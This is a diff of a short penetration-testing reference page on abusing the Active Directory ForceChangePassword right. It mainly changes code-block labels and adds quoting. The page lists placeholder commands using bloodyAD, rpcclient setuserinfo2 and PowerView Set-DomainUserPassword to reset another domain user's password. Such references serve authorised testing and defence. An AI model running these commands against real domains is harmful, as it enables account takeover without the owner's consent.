@@ -4,7 +4,6 @@ date: 2024-7-18
 tags: ["ForceChangePassword", "active driectory", "ad", "Windows"]
 ---
 
----
 ### Change target user password (From Linux)
 
 {{< tab set1 tab1 active >}}BloodyAD{{< /tab >}}
@@ -13,8 +12,8 @@ tags: ["ForceChangePassword", "active driectory", "ad", "Windows"]
 
 <div>
 
-```bash
-python3 bloodyAD.py -d <DOMAIN> -u <USERNAME> -p <PASSWORD> --host <DC> set password <TARGET_USER> <NEW_PASSWORD>
+```console
+python3 bloodyAD.py -d <DOMAIN> -u <USER> -p '<PASSWORD>' --host <DC> set password <TARGET_USER> '<NEW_PASSWORD>'
 ```
 
 </div>
@@ -26,7 +25,7 @@ python3 bloodyAD.py -d <DOMAIN> -u <USERNAME> -p <PASSWORD> --host <DC> set pass
 
 <div>
 
-```bash
+```console
 rpcclient -U '<DOMAIN>/<USER>%<PASSWORD>' <TARGET> -c 'setuserinfo2 <TARGET_USER> 23 <TARGET_USER_NEW_PASSWORD>'
 ```
 
@@ -43,7 +42,7 @@ rpcclient -U '<DOMAIN>/<USER>%<PASSWORD>' <TARGET> -c 'setuserinfo2 <TARGET_USER
 
 <div>
 
-```powershell
+```console
 . .\PowerView.ps1
 ```
 
@@ -53,11 +52,11 @@ rpcclient -U '<DOMAIN>/<USER>%<PASSWORD>' <TARGET> -c 'setuserinfo2 <TARGET_USER
 
 <div>
 
-```powershell
-$password = ConvertTo-SecureString <PASSWORD> -AsPlainText -Force 
+```console
+$password = ConvertTo-SecureString '<PASSWORD>' -AsPlainText -Force 
 ```
 
-```powershell
+```console
 Set-DomainUserPassword -Identity <TARGET_USER> -AccountPassword $password
 ```
 
